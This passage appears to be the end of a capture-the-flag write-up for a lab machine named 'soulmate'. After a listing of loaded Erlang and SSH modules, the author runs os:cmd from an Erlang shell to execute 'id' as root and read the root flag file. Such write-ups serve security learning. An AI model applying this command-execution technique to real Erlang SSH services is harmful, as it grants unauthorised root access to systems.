raw_file_io           /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/raw_file_io.beam
raw_file_io_list      /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/raw_file_io_list.beam
re                    /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/re.beam
rpc                   /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/rpc.beam
sets                  /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/sets.beam
shell                 /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/shell.beam
shell_default         /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/shell_default.beam
socket_registry       preloaded
sofs                  /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/sofs.beam
ssh                   /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh.beam
ssh_acceptor          /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_acceptor.beam
ssh_acceptor_sup      /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_acceptor_sup.beam
ssh_app               /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_app.beam
ssh_auth              /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_auth.beam
ssh_bits              /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_bits.beam
ssh_channel_sup       /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_channel_sup.beam
ssh_cli               /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_cli.beam
ssh_client_channel    /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_client_channel.beam
ssh_connection        /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_connection.beam
ssh_connection_handl  /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_connection_handler.beam
ssh_connection_sup    /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_connection_sup.beam
ssh_dbg               /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_dbg.beam
ssh_file              /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_file.beam
ssh_fsm_kexinit       /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_fsm_kexinit.beam
ssh_fsm_userauth_ser  /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_fsm_userauth_server.beam
ssh_lib               /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_lib.beam
ssh_message           /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_message.beam
ssh_options           /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_options.beam
ssh_server_channel    /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_server_channel.beam
ssh_sftpd             /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_sftpd.beam
ssh_system_sup        /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_system_sup.beam
ssh_tcpip_forward_ac  /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_tcpip_forward_acceptor_sup.beam
ssh_transport         /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_transport.beam
standard_error        /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/standard_error.beam
start_escript__escri  /usr/local/lib/erlang_login/start.escript
string                /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/string.beam
supervisor            /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/supervisor.beam
supervisor_bridge     /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/supervisor_bridge.beam
sys_core_alias        /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/sys_core_alias.beam
sys_core_bsm          /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/sys_core_bsm.beam
sys_core_fold         /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/sys_core_fold.beam
unicode               /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/unicode.beam
unicode_util          /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/unicode_util.beam
user_drv              /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/user_drv.beam
user_sup              /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/user_sup.beam
v3_core               /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/v3_core.beam
zlib                  preloaded
ok
```

If we use `os` we can try to execute some commands:

```
(ssh_runner@soulmate)3> os:cmd("id").
"uid=0(root) gid=0(root) groups=0(root)\n"
```

Ok nice! We have root commands!

```
(ssh_runner@soulmate)4> os:cmd("cat ../../root/root.txt").

"85b6762c1d0b3ac000bc28cf19b89cf0\n"
```

Here it is! We retrived the root flag!